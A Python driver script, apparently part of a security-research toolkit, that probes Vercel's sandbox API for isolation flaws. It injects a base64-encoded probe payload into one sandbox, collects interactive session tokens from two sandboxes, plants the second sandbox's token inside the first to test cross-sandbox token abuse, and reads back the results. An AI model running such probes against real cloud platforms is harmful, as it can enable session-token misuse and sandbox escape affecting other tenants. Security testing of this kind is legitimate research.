# -*- coding: utf-8 -*-
"""v221 驱动: 双沙箱 A/B 都调 interactive -> A 的 guest 里 token 交叉 + ws 消息 + 路径模糊"""
import sys, os, time, base64, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ, fresh_sandbox, cmd

NAME_A, NAME_B = 'v221a', 'v221b'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda221_probe_guest.py'


def inject(sid, dst, content):
    b64 = base64.b64encode(content if isinstance(content, bytes) else content.encode()).decode()
    s = "import base64;open('%s','wb').write(base64.b64decode('%s'))" % (dst, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 60000)
    print('[inject %s]' % dst, c)
    return c


def wf(sid, path, data):
    b64 = base64.b64encode(data.encode()).decode()
    s = "import base64;open('%s','w').write(base64.b64decode('%s').decode())" % (path, b64)
    c, r = cmd(sid, 'python3', ['-c', s], 20000)
    print('[wf %s]' % path, c)
    return c


def main():
    t0 = time.time()
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_A, TEAM, PROJ))
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_B, TEAM, PROJ))
    sid_a = fresh_sandbox(NAME_A)
    sid_b = fresh_sandbox(NAME_B)
    print('[create ok] %.0fs A=%s B=%s' % (time.time() - t0, sid_a, sid_b))

    inject(sid_a, '/vercel/sandbox/vda221_probe_guest.py', open(PAY, 'rb').read())

    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid_a, TEAM),
               {'command': 'python3', 'args': ['/vercel/sandbox/vda221_probe_guest.py'],
                'wait': False, 'timeout': 180000}, timeout=30)
    print('[payload bg]', c, (r or '')[:150])

    # 两个沙箱都调 interactive
    tok_a, tok_b = '', ''
    for name, sid in [('A', sid_a), ('B', sid_b)]:
        c, r = api('POST', '/v2/sandboxes/sessions/%s/interactive?teamId=%s' % (sid, TEAM), {}, timeout=60)
        print('[interactive %s]' % name, c, (r or '')[:250])
        try:
            d = json.loads(r)
            if name == 'A':
                tok_a = d.get('token') or ''
            else:
                tok_b = d.get('token') or ''
        except Exception:
            pass
    print('tok_a=%s' % (tok_a[:16] + '...' if tok_a else None))
    print('tok_b=%s' % (tok_b[:16] + '...' if tok_b else None))

    # 把两个 token 都写入 A 的沙箱
    if tok_a:
        wf(sid_a, '/vercel/sandbox/v221_tok_a', tok_a)
    if tok_b:
        wf(sid_a, '/vercel/sandbox/v221_tok_b', tok_b)

    time.sleep(100)
    c, r = cmd(sid_a, 'bash', ['-c', 'cat /vercel/sandbox/v221a.out 2>&1'], 30000)
    print('[read v221a.out]', c)
    print((r or '')[:40000])

    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_A, TEAM, PROJ))
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME_B, TEAM, PROJ))
    print('CLEANED total %.0fs' % (time.time() - t0))


if __name__ == '__main__':
    main()
